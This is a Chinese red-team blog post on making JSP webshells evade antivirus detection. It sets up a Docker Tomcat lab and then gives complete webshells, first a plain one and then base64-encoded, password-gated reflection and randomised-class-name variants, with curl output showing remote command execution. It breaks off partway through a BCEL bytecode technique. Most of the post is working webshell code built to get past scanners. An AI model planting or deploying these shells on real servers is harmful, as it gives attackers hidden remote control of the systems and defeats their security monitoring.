<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">
  <meta name="google-site-verification" content="e1iwRhdDRUGkBandwtaXVgqhNwYn1qtFuAYbOSPWpcI">
  <meta name="baidu-site-verification" content="code-NObBqxefR1">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="知人者智，自知者明。  jsp免杀学习。主要参考少许电华师傅的视频和文章，以及其他师傅的文章做参考。">
<meta property="og:type" content="article">
<meta property="og:title" content="jsp免杀">
<meta property="og:url" content="http://example.com/jsp%E5%85%8D%E6%9D%80/index.html">
<meta property="og:site_name" content="runer.io">
<meta property="og:description" content="知人者智，自知者明。  jsp免杀学习。主要参考少许电华师傅的视频和文章，以及其他师傅的文章做参考。">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2022-01-10T02:15:52.000Z">
<meta property="article:modified_time" content="2023-02-07T10:59:54.165Z">
<meta property="article:author" content="Rune">
<meta property="article:tag" content="免杀">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/jsp%E5%85%8D%E6%9D%80/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>jsp免杀 | runer.io</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">runer.io</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">Nothing</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/jsp%E5%85%8D%E6%9D%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpeg">
      <meta itemprop="name" content="Rune">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="runer.io">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          jsp免杀
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-01-10 10:15:52" itemprop="dateCreated datePublished" datetime="2022-01-10T10:15:52+08:00">2022-01-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-02-07 18:59:54" itemprop="dateModified" datetime="2023-02-07T18:59:54+08:00">2023-02-07</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/" itemprop="url" rel="index"><span itemprop="name">红队技术</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <blockquote>
<p>知人者智，自知者明。</p>
</blockquote>
<p>jsp免杀学习。主要参考少许电华师傅的视频和文章，以及其他师傅的文章做参考。</p>
<span id="more"></span>



<h2 id="1-JSP浅析"><a href="#1-JSP浅析" class="headerlink" title="1. JSP浅析"></a>1. JSP浅析</h2><p>整个JSP的内容实际上是一个HTML，但是稍有不同：</p>
<ul>
<li>包含在<code>&lt;%--</code>和<code>--%&gt;</code>之间的是JSP的注释，它们会被完全忽略；</li>
<li>包含在<code>&lt;%</code>和<code>%&gt;</code>之间的是Java代码，可以编写任意Java代码；</li>
<li>如果使用<code>&lt;%= xxx %&gt;</code>则可以快捷输出一个变量的值。</li>
</ul>
<p>JSP页面内置了几个变量：</p>
<ul>
<li>out：表示HttpServletResponse的PrintWriter；</li>
<li>session：表示当前HttpSession对象；</li>
<li>request：表示HttpServletRequest对象。</li>
</ul>
<p>这几个变量可以直接使用。</p>
<h2 id="2-构建webshell测试环境"><a href="#2-构建webshell测试环境" class="headerlink" title="2. 构建webshell测试环境"></a>2. 构建webshell测试环境</h2><p>在主机上创建tomcat目录：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p <span class="regexp">/usr/</span>local<span class="regexp">/tomcat/</span>webapps</span><br></pre></td></tr></table></figure>

<p>是用docker构建tomcat:</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p <span class="number">8081</span>:<span class="number">8080</span> -v <span class="regexp">/usr/</span>local<span class="regexp">/tomcat/</span>webapps:<span class="regexp">/usr/</span>local<span class="regexp">/tomcat/</span>webapps --name mytomcat tomcat</span><br></pre></td></tr></table></figure>

<p>创建一个tomcat app</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p <span class="regexp">/usr/</span>local<span class="regexp">/tomcat/</span>webapps/webshell</span><br></pre></td></tr></table></figure>

<p>编写一个最简单的jsp webshell:</p>
<p>jspshell0.jsp:</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    Runtime runtime = Runtime.getRuntime();</span><br><span class="line">    String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    Process process = runtime.exec(cmd);</span><br><span class="line">    java.io.InputStream in = process.getInputStream();</span><br><span class="line">    out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    java.io.InputStreamReader resultReader = <span class="keyword">new</span> java.io.InputStreamReader(in);</span><br><span class="line">    java.io.BufferedReader stdInput = <span class="keyword">new</span> java.io.BufferedReader(resultReader);</span><br><span class="line">    String s = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">while</span> ((s = stdInput.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将这个webshell放到docker映射的tomcat web主机目录上。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[shadowflow@ShadowOS /tmp]% scp jspshell0.jsp debian:/usr/<span class="built_in">local</span>/tomcat/webapps/webshell/</span><br><span class="line">jspshell0.jsp                                           100%  626     1.1MB/s   00:00</span><br></pre></td></tr></table></figure>

<p>然后访问访问。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[shadowflow@ShadowOS /tmp]% curl http://172.16.42.150:8081/webshell/jspshell0.jsp?cmd=whoami</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;root</span><br><span class="line">&lt;/pre&gt;%</span><br></pre></td></tr></table></figure>



<h2 id="3-最简单的马测试"><a href="#3-最简单的马测试" class="headerlink" title="3. 最简单的马测试"></a>3. 最简单的马测试</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    Runtime runtime = <span class="module-access"><span class="module"><span class="identifier">Runtime</span>.</span></span>get<span class="constructor">Runtime()</span>;</span><br><span class="line">    String cmd = request.get<span class="constructor">Parameter(<span class="string">&quot;cmd&quot;</span>)</span>;</span><br><span class="line">    Process process = runtime.exec(cmd);</span><br><span class="line">    java.io.InputStream <span class="keyword">in</span> = process.get<span class="constructor">InputStream()</span>;</span><br><span class="line">    out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    java.io.InputStreamReader resultReader = <span class="keyword">new</span> java.io.<span class="constructor">InputStreamReader(<span class="params">in</span>)</span>;</span><br><span class="line">    java.io.BufferedReader stdInput = <span class="keyword">new</span> java.io.<span class="constructor">BufferedReader(<span class="params">resultReader</span>)</span>;</span><br><span class="line">    String s = null;</span><br><span class="line">    <span class="keyword">while</span> ((s = stdInput.read<span class="constructor">Line()</span>) != null) &#123;</span><br><span class="line">        out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如上jsp代码，<code>&lt;%@ page ... %&gt;</code> 定义网页依赖属性，比如脚本语言、error页面、缓存需求等等，body标签里面先获取Runtime对象。request是JSP内置变量，表示HttpServletRequest对象，通过request拿到url请求中的cmd变量，然后通过Runtime对象调用exec方法执行cmd参数传递的指令。然后将执行的结果传入InputStream，然后打印出结果。</p>
<h2 id="4-base64马"><a href="#4-base64马" class="headerlink" title="4. base64马"></a>4. base64马</h2><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Base64&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    Runtime runtime = Runtime.getRuntime();</span><br><span class="line">    String cmdx = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    <span class="keyword">byte</span>[] decodedBytes = Base64.getDecoder().decode(cmdx);</span><br><span class="line">    String cmd = <span class="keyword">new</span> String(decodedBytes);</span><br><span class="line">    Process process = runtime.exec(cmd);</span><br><span class="line">    java.io.InputStream in = process.getInputStream();</span><br><span class="line">    out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    java.io.InputStreamReader resultReader = <span class="keyword">new</span> java.io.InputStreamReader(in);</span><br><span class="line">    java.io.BufferedReader stdInput = <span class="keyword">new</span> java.io.BufferedReader(resultReader);</span><br><span class="line">    String s = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">while</span> ((s = stdInput.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><code>http://172.16.42.151:8081/aa.jsp?cmd=aWQ=</code></p>
<p>注意参数必须是base64格式，不然会报错</p>
<h2 id="5-反射方式"><a href="#5-反射方式" class="headerlink" title="5. 反射方式"></a>5. 反射方式</h2><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// 加入一个密码</span></span><br><span class="line">    String PASSWORD = <span class="string">&quot;password&quot;</span>;</span><br><span class="line">    String passwd = request.getParameter(<span class="string">&quot;pwd&quot;</span>);</span><br><span class="line">    String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!passwd.equals(PASSWORD)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 反射调用</span></span><br><span class="line">    Class rt = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">    java.lang.reflect.Method gr = rt.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">    java.lang.reflect.Method ex = rt.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">    Process process = (Process) ex.invoke(gr.invoke(<span class="keyword">null</span>), cmd);</span><br><span class="line">    java.io.InputStream in = process.getInputStream();</span><br><span class="line">    out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    java.io.InputStreamReader resultReader = <span class="keyword">new</span> java.io.InputStreamReader(in);</span><br><span class="line">    java.io.BufferedReader stdInput = <span class="keyword">new</span> java.io.BufferedReader(resultReader);</span><br><span class="line">    String s = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">while</span> ((s = stdInput.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[shadowflow@ShadowOS ~]% curl http://localhost:8080/jspshell/jsp1.jsp?cmd=id&amp;<span class="built_in">pwd</span>=password</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;uid=501(shadowflow) gid=20(staff) groups=20(staff),501(access_bpf),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),703(com.apple.sharepoint.group.3),702(com.apple.sharepoint.group.2),701(com.apple.sharepoint.group.1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae)</span><br><span class="line">&lt;/pre&gt;%</span><br></pre></td></tr></table></figure>



<h2 id="6-利用随机数运行时可知字符串绕过"><a href="#6-利用随机数运行时可知字符串绕过" class="headerlink" title="6. 利用随机数运行时可知字符串绕过"></a>6. 利用随机数运行时可知字符串绕过</h2><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;sun.reflect.misc.MethodUtil&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Random&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String s2 = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    Class rt;</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            rt = Class.forName(<span class="string">&quot;java.lang.&quot;</span> + (<span class="keyword">new</span> String(Character.toChars(<span class="keyword">new</span> Random().nextInt(<span class="number">3</span>) + <span class="number">80</span>))) + <span class="string">&quot;untime&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable throwable) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Field currentRuntime = rt.getDeclaredFields()[<span class="number">0</span>];</span><br><span class="line">    currentRuntime.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Object o = currentRuntime.get(<span class="keyword">null</span>);</span><br><span class="line">    Process process;</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Method method = rt.getDeclaredMethods()[<span class="keyword">new</span> Random().nextInt(<span class="number">20</span>)];</span><br><span class="line">            method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            process = (Process) MethodUtil.invoke(method, o, <span class="keyword">new</span> Object[]&#123;s2.split(<span class="string">&quot; &quot;</span>)&#125;);</span><br><span class="line">            <span class="keyword">if</span> (process ==  <span class="keyword">null</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable throwable) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    InputStream inputStream = process.getInputStream();</span><br><span class="line">    StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(inputStream));</span><br><span class="line">    out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    String s = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">while</span> ((s = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>利用：</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[shadowflow<span class="meta">@ShadowOS</span> ~]% curl http:<span class="comment">//localhost:8080/jspshell/jsp2.jsp?cmd=whoami</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">pre</span>&gt;</span>shadowflow</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span>%</span><br></pre></td></tr></table></figure>



<h2 id="7-BCEL字节码的JSP"><a href="#7-BCEL字节码的JSP" class="headerlink" title="7. BCEL字节码的JSP"></a>7. BCEL字节码的JSP</h2><p>BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，BCEL库提供了一系列用于分析、创建、修改Java Class文件的API。他比Commons Collections特殊的一点是，它被包含在了原生的JDK中，位于<code>com.sun.org.apache.bcel</code>。</p>
<p>==在Java 8u251以后,BCEL不再适用。==我们在构建环境的时候tomcat运行环境的java必须要低于此版本才能成功。</p>
<p>先编写一个exp</p>
<p>exp.java:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exp</span> </span>&#123;</span><br><span class="line">    String res;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exp</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">        BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line=reader.readLine())!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            stringBuilder.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="keyword">this</span>.res = stringBuilder.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>再在同一个目录下编写一个程序将exp.java转为字节码</p>
<p>Util.java:</p>
